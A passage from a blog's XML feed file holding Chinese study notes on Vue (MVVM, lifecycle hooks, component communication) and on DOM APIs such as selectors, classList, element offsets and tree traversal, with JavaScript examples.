}})</code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习（一）之概览</title>
      <link href="/2018/10/15/vue-xue-xi-yi-zhi-gai-lan/"/>
      <url>/2018/10/15/vue-xue-xi-yi-zhi-gai-lan/</url>
      
        <content type="html"><![CDATA[<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul><li><a href="https://cn.vuejs.org/v2/guide/" target="_blank" rel="noopener">Vue.js</a></li><li><a href="https://www.w3cplus.com/vue/renderless-components-in-vuejs.html" target="_blank" rel="noopener">Vue中的无渲染组件</a></li></ul><h4 id="Vue是什么"><a href="#Vue是什么" class="headerlink" title="Vue是什么"></a>Vue是什么</h4><blockquote><p>Vue是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。  </p></blockquote><p>一句话来说，Vue是用来构建用户界面的渐进式框架，也是一个非常典型的基于MVVM思想的框架</p><h4 id="MVVM是什么"><a href="#MVVM是什么" class="headerlink" title="MVVM是什么"></a>MVVM是什么</h4><p>MVVM是Model-View-ViewModel的缩写。MVVM是一种设计思想，解释：</p><ul><li>Model层代表数据模型，也可以在Model中定义数据修改和操作的业务逻辑</li><li>View代表UI组件，将数据模型转化成UI展现出来</li><li>ViewModel是一个同步View和Model的对象</li></ul><p>在MVVM架构下，ViewModel通过双向数据绑定把View层和Model层连接起来，而View和Model之间的同步工作完全是自动的，无需人为干涉，因此开发者只需关注业务逻辑，不需要手动操作DOM，不需要关注数据状态的同步问题。<br>在Vue中我们可以将Model层理解成<code>data</code>，View层理解成用来挂载Vue实例的DOM元素<code>el:&#39;#app&#39;</code>，双向绑定是Vue内部实现的。<br><img src="/img/in-post/vue-01.JPG" alt="vue MVVM"></p><h4 id="Vue的优点"><a href="#Vue的优点" class="headerlink" title="Vue的优点"></a>Vue的优点</h4><ul><li>低耦合：视图（View）可以独立于 Model 变化和修改，一个ViewModel 可以绑定到不同的”View”上，当View变化的时候Model可以不变，当Model变化的时候 View 也可以不变</li><li>可重用性：你可以把一些视图逻辑放在一个ViewModel里面，让很多view重用这段视图逻辑</li><li>独立开发：开发人员可以专注于业务逻辑和数据的开发（ViewModel），设计人员可以专注于页面设计，使用 Expression Blend 可以很容易设计界面并生成 xml 代码</li><li>可测试：界面素来是比较难于测试的，而现在测试可以针对 ViewModel 来写</li></ul><h4 id="Vue生命周期"><a href="#Vue生命周期" class="headerlink" title="Vue生命周期"></a>Vue生命周期</h4><p><img src="/img/in-post/vue-03.png" alt="vue lifecircle"></p><ul><li><code>beforeCreate</code>：在实例初始化之后，数据观测(data observer) 和 event/watcher 事件配置之前被调用</li><li><code>created</code>：实例已经创建完成之后被调用。在这一步，实例已完成以下的配置：数据观测(data observer)，属性和方法的运算， watch/event 事件回调</li><li><code>beforeMount</code>：在挂载开始之前被调用：相关的 render 函数首次被调用</li><li><code>mounted</code>：el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子</li><li><code>beforeUpdate</code>：数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁之前</li><li><code>update</code>：当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。然而在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环</li><li><code>beforeDestroy</code>：实例销毁之前调用。在这一步，实例仍然完全可用</li><li><code>destroyed</code>：Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。 该钩子在服务器端渲染期间不被调用</li></ul><h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><p><img src="/img/in-post/vue-02.png" alt="vue kg"></p><ul><li>计算属性与侦听器<ul><li>计算属性缓存 vs 方法: 我们可以将同一函数定义为一个方法而不是一个计算属性。两种方式的最终结果确实是完全相同的。然而，不同的是计算属性是基于它们的依赖进行缓存的。只在相关依赖发生改变时它们才会重新求值。</li><li>计算属性 vs 侦听属性：当需要在数据变化时执行异步或开销较大的操作时，侦听这个方式是最有用的</li></ul></li></ul><h4 id="组件间传值"><a href="#组件间传值" class="headerlink" title="组件间传值"></a>组件间传值</h4><ul><li>父组件向子组件传递数据<ul><li>子组件：通过<code>props</code>接受数据</li><li>父组件：通过在子组件标签上使用<code>v-bind</code>或者直接赋值传值给子组件</li></ul></li><li>所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。这样会防止从子组件意外改变父级组件的状态，从而导致你的应用的数据流向难以理解</li><li>子组件向父组件传递数据<ul><li>子组件：使用内建的 $emit 方法并传入事件的名字</li><li>父组件：使用<code>v-on</code>监听这个事件，就像监听一个原生 DOM 事件</li></ul></li><li><code>v-model</code>：结合两者，双向传递</li></ul><h4 id="Vue的双向数据绑定是怎么实现的"><a href="#Vue的双向数据绑定是怎么实现的" class="headerlink" title="Vue的双向数据绑定是怎么实现的"></a>Vue的双向数据绑定是怎么实现的</h4><p><a href="https://segmentfault.com/a/1190000006599500?utm_source=tag-newest" target="_blank" rel="noopener">链接</a></p><ul><li>将MVVM作为数据绑定的入口，整合Observer，Compile和Watcher三者</li><li>通过Observer来监听自己的model的数据变化，当数据变化时Dep订阅者会发出通知</li><li>Watcher接到通知会调用Compile里面的更新回调函数更新视图</li><li>通过Compile来解析编译模板指令：将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知</li><li>最终利用watcher搭起observer和Compile之间的通信桥梁，达到数据变化 —&gt;视图更新；视图交互变化（input）—&gt;数据model变更双向绑定效果。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOM详解（二）</title>
      <link href="/2018/10/12/dom-xiang-jie-er/"/>
      <url>/2018/10/12/dom-xiang-jie-er/</url>
      
        <content type="html"><![CDATA[<h5 id="选择符API"><a href="#选择符API" class="headerlink" title="选择符API"></a>选择符API</h5><ul><li><code>querySelector</code>: 接收一个CSS选择符，返回与该模式匹配的第一个元素，如果没有找到匹配的元素，则返回null<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> body <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> myDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#myDiv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> selected <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".selected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><code>querySelectorAll</code>：接收一个CSS选择符，返回所有匹配的元素，即一个NodeList的实例<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> ems <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myDiv"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">"em"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> strongs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">"p strong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span>  i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> strongs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> strong <span class="token operator">=</span> strongs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  strong<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"important"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li><code>matchesSelector</code>：接收一个CSS选择符，如果调用元素与该选择符匹配则返回<code>true</code>否则返回<code>false</code><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//兼容</span><span class="token keyword">function</span> <span class="token function">matchesSelector</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span> selector<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>matchesSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> elemnt<span class="token punctuation">.</span><span class="token function">matchesSelector</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>elemnt<span class="token punctuation">.</span>msMatchesSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> elemnt<span class="token punctuation">.</span><span class="token function">msMatchesSelector</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>elemnt<span class="token punctuation">.</span>mozMatchesSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> elemnt<span class="token punctuation">.</span>mozMatchesSelector  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>elemnt<span class="token punctuation">.</span>webkitMatchesSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> elemnt<span class="token punctuation">.</span><span class="token function">webkitMatchesSelector</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Not supported."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="元素遍历"><a href="#元素遍历" class="headerlink" title="元素遍历"></a>元素遍历</h5><ul><li>对于元素之间的空格，IE9及之前版本不会返回文本节点，而其他所有浏览器都会返回文本节点。这样，就导致了在使用childNodes和firstChild等属性时的行为不一致。ElementTraversal新定义了一组属性：<ul><li><code>childElementCount</code>: 返回子元素（不包括文本节点和注释）的个数</li><li><code>firstElementChild</code>：指向第一个子元素</li><li><code>lastElementChild</code>：指向最后一个子元素</li><li><code>previousElementSibling</code>：指向前一个同辈元素</li><li><code>nextElementSibling</code>：指向后一个同辈元素</li></ul></li><li>跨浏览器遍历1<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i<span class="token punctuation">,</span> len<span class="token punctuation">,</span> child <span class="token operator">=</span> element<span class="token punctuation">.</span>firstChild<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>child <span class="token operator">!=</span> elemnt<span class="token punctuation">.</span>lastChild<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>child<span class="token punctuation">.</span>nodeType <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">processChild</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  child <span class="token operator">=</span> child<span class="token punctuation">.</span>nextSibling<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>跨浏览器遍历2<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i<span class="token punctuation">,</span> len<span class="token punctuation">,</span> child <span class="token operator">=</span> elemnt<span class="token punctuation">.</span>firstElementChild<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>child <span class="token operator">!=</span> elemnt<span class="token punctuation">.</span>lastElementChild<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">processChild</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>  child <span class="token operator">=</span> child<span class="token punctuation">.</span>nextElementSibling<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h5><ul><li>类相关扩充<ul><li><code>getElementByClassName()</code>：接收一个参数，包含一个或多个类名的字符串(类的顺序不重要)，返回带有指定类的所有元素的NodeList</li><li>classList属性<ul><li>在操作类名时，粗腰通过className属性添加、删除和替换类名。因为className中是一个字符串，所以即使只修改字符串的一部分，也必须每次都设置整个字符串的值，比如：<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"bd user disables"</span><span class="token operator">></span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token keyword">var</span> classNames <span class="token operator">=</span> div<span class="token punctuation">.</span>className<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex">/\s+/</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> pos <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> len<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> classNames<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>className<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  pos <span class="token operator">=</span> i<span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>classNames<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>div<span class="token punctuation">.</span>className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>新增类操作方法：<code>add(value)</code>、<code>contains(value)</code>、<code>remove(value)</code>、<code>toggle(value)</code>, 例子：<pre class=" language-javascript"><code class="language-javascript">div<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"disabled"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>div<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"current"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果列表中已存在给定的值，删除它；如果列表中没有给定的值，添加它；</span>div<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//判断元素中是否包含既定的类名</span><span class="token keyword">if</span><span class="token punctuation">(</span>div<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>div<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"disabled"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//pass</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 迭代类名</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> div<span class="token punctuation">.</span>classList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">doSomething</span><span class="token punctuation">(</span>div<span class="token punctuation">.</span>classList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li><li>焦点管理： 元素获得焦点的方式有：页面加载、用户输入和在代码中调用focus方法<ul><li>activeElement, hasFocus()<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> button <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myButton"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>button<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>activeElement <span class="token operator">===</span> button<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">hasFocus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true;检测文档是否获得焦点，可以知道用户u是否正在与页面交互</span></code></pre></li></ul></li><li>HTMLDocument的变化<ul><li>document的readyState有两个可能的值<ul><li>loading: 正在加载文档</li><li>complete：已经加载完毕文档</li></ul></li><li>head属性：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> head <span class="token operator">=</span> document<span class="token punctuation">.</span>head <span class="token operator">||</span> document<span class="token punctuation">.</span><span class="token function">getElementByTagName</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre></li></ul></li><li>字符集属性<ul><li>document.charset</li><li>document.defaultChartset</li></ul></li><li>自定义数据属性：HTML5规定可以为元素添加非标准的属性，但要添加前缀<code>data-</code>，目的是为元素提供与渲染无关的信息或者语义化信息。这些属性可以任意添加、随便命名，只要以<code>data-</code>开头即可<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"mydiv"</span> data<span class="token operator">-</span>appId<span class="token operator">=</span><span class="token string">"12345"</span> data<span class="token operator">-</span>myname<span class="token operator">=</span><span class="token string">"Nicholas"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"mydiv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> appId <span class="token operator">=</span> div<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>appId<span class="token punctuation">;</span></code></pre></li><li>插入标记<ul><li><code>innerHTML</code><ul><li>为innerHTML设置HTML字符串后，浏览器会将这个字符串解析为相应的DOM树；</li><li>一般来说插入<code>&lt;script&gt;</code>脚本元素是无效的；</li><li>不支持的元素有：<code>col</code>、<code>colgroup</code>、<code>frameset</code>、<code>head</code>、<code>html</code>、<code>style</code>、<code>table</code>、<code>tbody</code>、<code>thead</code>、<code>tfoot</code>、<code>tr</code></li><li>从源中删除所有脚本节点和时间处理程序属性：<code>window.toStaticHTML(domString)</code></li></ul></li><li><code>outHTML</code>：返回调用它的元素及所有子节点</li><li><code>insertAdjacentHTML()</code>：两个参数，插入位置和插入的HTML文本<ul><li>“beforebegin”：在当前元素之前插入一个紧邻的同辈元素</li><li>“afterbegin”：在第一个子元素之前插入一个新的子元素</li><li>“beforeend”：在最后一个子元素之后再插入新的子元素</li><li>“afterend”：在当前元素之后插入一个紧邻的同辈元素</li></ul></li></ul></li></ul><h5 id="元素大小"><a href="#元素大小" class="headerlink" title="元素大小"></a>元素大小</h5><ul><li><p>偏移量：元素在屏幕上占用的所有可见空间。由高度、宽度决定（包括内边距、滚动条、边框大小）</p><ul><li><code>offsetHeight</code>：元素在垂直方向上占用的空间大小</li><li><code>offsetWidth</code>：元素在水平方向上占用空间的大小</li><li><code>offsetLeft</code>：元素左外边框至包含元素的左内边框之间的像素距离</li><li><code>offsetTop</code>：元素上外边框至包含元素的上内边框之间的像素距离</li><li>计算某个元素在页面上的偏移量<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getElementLeft</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> actualLeft <span class="token operator">=</span> element<span class="token punctuation">.</span>offsetLeft<span class="token punctuation">;</span><span class="token keyword">var</span> current <span class="token operator">=</span> element<span class="token punctuation">.</span>offsetParent<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>current <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  actualLeft <span class="token operator">+</span><span class="token operator">=</span> current<span class="token punctuation">.</span>offsetLeft<span class="token punctuation">;</span>  current <span class="token operator">=</span> current<span class="token punctuation">.</span>offsetParent<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> actualLeft<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>所有这些偏移量都是只读的，而且每次访问需要重新计算。因此应该尽量避免重复访问这些属性；如果需要重复使用其中某些值，可以将它们保存在局部变量中，以提高性能。</li></ul></li><li><p>客户区：指元素内容及其内边距占据的空间大小</p><ul><li>确定浏览器视口大小：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getViewport</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>compatMode <span class="token operator">==</span> <span class="token string">"BackCompat"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    width<span class="token punctuation">:</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span>    height<span class="token punctuation">:</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientHeight  <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    width<span class="token punctuation">:</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span>    height<span class="token punctuation">:</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li><li>滚动大小</li></ul><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><ul><li>NodeIterator：深度优先遍历<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 返回遍历遇到的&lt;li>元素</span><span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"div1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> filter <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> node<span class="token punctuation">.</span>tagName<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"li"</span> <span class="token operator">?</span> NodeFilter<span class="token punctuation">.</span>Filter_ACCEPT <span class="token punctuation">:</span> NodeFilter<span class="token punctuation">.</span>Filter_SKIP<span class="token punctuation">;</span><span class="token punctuation">}</span>VAR iterator <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>div<span class="token punctuation">,</span> NodeFilter<span class="token punctuation">.</span>SHOW_ELEMENT<span class="token punctuation">,</span> filter<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> node <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token function">alert</span><span class="token punctuation">(</span>node <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   node <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>TreeWalker<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> walker <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createTreeWalker</span><span class="token punctuation">(</span>div<span class="token punctuation">,</span> NodeFilter<span class="token punctuation">.</span>SHOW_ELEMENT<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> node <span class="token operator">=</span> walker<span class="token punctuation">.</span><span class="token function">firstChild</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">alert</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span><span class="token punctuation">;</span>  node <span class="token operator">=</span> walker<span class="token punctuation">.</span><span class="token function">nextSibling</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>区别：使用NodeIterator对象时，NodeFilter.Filter_SKIP与NodeFilter.Filter_REJECT作用相同，都是跳过指定的节点；使用TreeWalker对象，NodeFilter.Filter_SKIP会跳过响应的节点继续前进到子树的下一个节点，NodeFilter.Filter_REJECT则会跳过相应节点及整个子树</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOM详解（一）</title>
      <link href="/2018/10/11/dom-xiang-jie-yi/"/>
      <url>/2018/10/11/dom-xiang-jie-yi/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li>《JavaScript高级教程》</li><li>《高性能JavaScript》</li></ul><h3 id="节点层次"><a href="#节点层次" class="headerlink" title="节点层次"></a>节点层次</h3><h5 id="Node类型及对应数值"><a href="#Node类型及对应数值" class="headerlink" title="Node类型及对应数值"></a>Node类型及对应数值</h5><ul><li>Node.ELEMENT_NODE(1)</li><li>Node.ATTRIBUTE_NODE(2)</li><li>Node.TEXT_NODE(3)</li><li>Node.CDATA_SECTION_NODE(4)</li><li>Node.ENTITY_REFERENCE_NODE(5)</li><li>Node.ENTITY_NODE(6)</li><li>Node.PROCESSING_INSTRUCTION_NODE(7)</li><li>Node.COMMENT_NODE(8)</li><li>Node.DOCUMENT_NODE(9)</li><li>Node.DOCUMENT_TYPE_NODE(10)</li><li>Node.DOCUMENT_FRAGMENT_NODE(11)</li><li>Node.NOTATION_NODE(12)</li></ul><h5 id="判断节点类型"><a href="#判断节点类型" class="headerlink" title="判断节点类型"></a>判断节点类型</h5><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>someNode<span class="token punctuation">.</span>nodeType <span class="token operator">==</span> Node<span class="token punctuation">.</span>ELEMENT_NODE<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Node is an elemnt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// IE中无效</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>someNode<span class="token punctuation">.</span>nodeType <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Node is an elemnt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" 